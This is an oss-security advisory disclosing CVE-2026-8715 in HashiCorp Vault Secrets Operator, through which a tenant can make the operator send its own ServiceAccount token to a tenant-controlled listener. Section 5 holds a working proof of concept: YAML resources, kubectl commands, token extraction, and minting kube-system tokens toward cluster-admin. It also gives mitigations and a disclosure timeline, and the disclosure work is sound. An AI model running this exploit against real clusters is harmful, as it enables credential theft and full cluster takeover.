X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/28/3
Message-ID: <gexQDAGmjwLg1BubHro23TUtYHmaile-O7dgaGR5wsWdIPVkJtBBjbekWJcQ59IBCJ5iBoekP5d-BD3bBnmUPjtXPSByEcNMYLM-lCv0GHM=@proton.me>
Date: Fri, 28 Aug 2026 13:27:26 +0000
From: cherez0ff <cherez0ff@...ton.me>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: [CVE-2026-8715] HashiCorp Vault Secrets Operator 1.3.0-1.4.1: tenant-controlled secretIDPath leaks operator ServiceAccount token (path to cluster-admin)
Content-Type: text/plain; charset=utf-8

Product: HashiCorp Vault Secrets Operator (VSO)
Affected: 1.3.0 up to 1.4.1
Fixed: 1.5.0
CVE: CVE-2026-8715
Vendor: HCSEC-2026-28
CWE: CWE-522 / CWE-918
Authors: Artem Cherezov (@cherez0ff)
Trung Nguyen (@everping, CyStack) - independent co-reporter
of the same issue to HashiCorp
Vendor advisory: https://discuss.hashicorp.com/t/hcsec-2026-28-vault-secrets-operator-vulnerable-to-arbitrary-file-read-via-approle-secretidpath/77645
Write-up: https://cherez0ff.art/blog/vault-secrets-operator-secretidpath-token-theft/

1. SUMMARY

VSO 1.3.0 introduced spec.appRole.secretIDPath on the VaultAuth and
VaultAuthGlobal custom resources, letting the operator read its
AppRole secret_id from a file in its own pod. The path is not
restricted to any particular file, and VaultConnection.spec.address
accepts an arbitrary URL. Both resources are namespaced and
tenant-writable.

Setting secretIDPath to the operator's own projected ServiceAccount
token and address to a tenant-controlled listener makes the operator
read that token and POST it to the tenant in the AppRole login body.

The leaked token reads and writes Secrets in every namespace and holds
create on serviceaccounts/token cluster-wide, which is one hop from
cluster-admin.

2. PRECONDITIONS

- VSO 1.3.0 - 1.4.1 installed in the cluster.
- Attacker holds create and get on vaultauths, vaultconnections and
vaultstaticsecrets in any single namespace. Per the vendor bulletin
these correspond to the editor ClusterRoles published by the VSO
Helm chart for end users, so this is the intended tenant grant
- Attacker can run a pod, or otherwise expose any HTTP endpoint the
operator can reach.

No cluster-scoped permission of any kind is required. Deployments that
do not let tenants create or modify VaultAuth or VaultConnection are
not affected.

3. BACKGROUND

VSO copies secrets out of Vault into Kubernetes Secrets. It introduces
three relevant namespaced custom resources:

VaultConnection - address of the Vault instance
VaultAuth - how to authenticate there
VaultStaticSecret - a request to copy a Vault secret into a K8s
Secret

A VaultStaticSecret references a VaultAuth, which references a
VaultConnection. All three are namespaced, so a tenant with rights in
their own namespace can create all of them.

4. VULNERABILITY

The operator is a single cluster-wide controller reconciling resources
it does not trust, and two fields of those resources steer where its
own credentials go.

VaultAuth.spec.appRole.secretIDPath (also present on
VaultAuthGlobal) was validated only for path traversal sequences, and
checked to be a regular file under a size limit. Which file it points
at was never constrained, so any readable path in the operator pod
qualifies - including
/var/run/secrets/kubernetes.io/serviceaccount/token.

VaultConnection.spec.address accepts an arbitrary URL with no
allowlist and no restriction to the Vault instance the administrator
intended. skipTLSVerify removes the last obstacle.

The operator reads the file and sends its contents as the AppRole
secret_id in the login request body to that address. A listener
answering with any well-formed Vault auth response is enough for the
login path to run far enough to transmit the credential.

The operator's ServiceAccount is broadly privileged by design: it must
read and write Secrets in every namespace to do its job, and it holds
create on serviceaccounts/token. That last verb means the stolen
identity can mint a token for any ServiceAccount in the cluster,
including controller ServiceAccounts in kube-system, without needing
any existing token.

5. PROOF OF CONCEPT

Tested against VSO 1.4.0 on kind v1.31.6. The tenant identity is a
ServiceAccount with edit in namespace "tenant" plus create/get on the
three VSO CRs there; full cluster and RBAC setup is in the write-up
linked above.

5.1 Listener in the tenant namespace, port 8200, logging request
bodies and replying with a valid-looking Vault auth response:

resp = b'{"auth":{"client_token":"hvs.poc","lease_duration":60,"renewable":false}}'

A python:3.12-slim pod running a BaseHTTPRequestHandler that prints
the body and returns the above for any method is sufficient. Expose
it as a Service:

kubectl -n tenant expose pod listener --port=8200 --target-port=8200

5.2 Point the operator at the listener and at its own token:

apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultConnection
metadata:
name: poc
namespace: tenant
spec:
address: http://listener.tenant.svc:8200
skipTLSVerify: true
---
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultAuth
metadata:
name: poc
namespace: tenant
spec:
vaultConnectionRef: poc
method: appRole
mount: poc
appRole:
roleId: poc
secretIDPath: /var/run/secrets/kubernetes.io/serviceaccount/token
---
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultStaticSecret
metadata:
name: poc
namespace: tenant
spec:
vaultAuthRef: poc
mount: secret
type: kv-v2
path: poc
refreshAfter: 10s
destination:
name: poc-dest
create: true
5.3 Read the token out of the listener log:

kubectl -n tenant logs listener | grep -ao '"secret_id":"eyJ[^"]*"' | head -1

5.4 Use it:

$ export KUBECONFIG=$PWD/kubeconfig-stolen

$ kubectl auth whoami
ServiceAccount system:serviceaccount:vault-secrets-operator-system:vault-secrets-operator-controller-manager

$ kubectl -n kube-system auth can-i get secret
yes

$ kubectl auth can-i create serviceaccounts/token
yes

$ kubectl -n kube-system create token namespace-controller
<token>

Enumerate ServiceAccounts, pick one with the permissions you want,mint its token. Cluster-admin follows trivially.

6. IMPACT

Any tenant able to create VSO custom resources in a single namespace
obtains read/write on all Secrets cluster-wide and can impersonate
arbitrary ServiceAccounts which leads to cluster-admin privilege escalation.

7. MITIGATION

- Upgrade to VSO 1.5.0 or later. The fix removes
spec.appRole.secretIDPath outright; existing VaultAuth objects using
it must be migrated to spec.appRole.secretRef, which references a
Kubernetes Secret holding the AppRole Secret ID.
- If you cannot upgrade, reject VaultAuth and VaultAuthGlobal objects
that set appRole.secretIDPath with an admission policy
(ValidatingAdmissionPolicy or equivalent).
- Do not grant tenants create or modify on VaultAuth, VaultAuthGlobal
or VaultConnection. Note that the editor ClusterRoles shipped by the
VSO Helm chart do grant this.
- A NetworkPolicy restricting the operator's egress to the intended
Vault endpoint breaks the exfiltration path, though it does not fix
the underlying read.

8. TIMELINE

2026-06-14 Reported to HashiCorp
2026-08-13 HCSEC-2026-28 published, fixed in VSO 1.5.0
2026-08-15 Public write-up

--
Artem Cherezovhttps://cherez0ff.art/ | https://github.com/cherez0ff
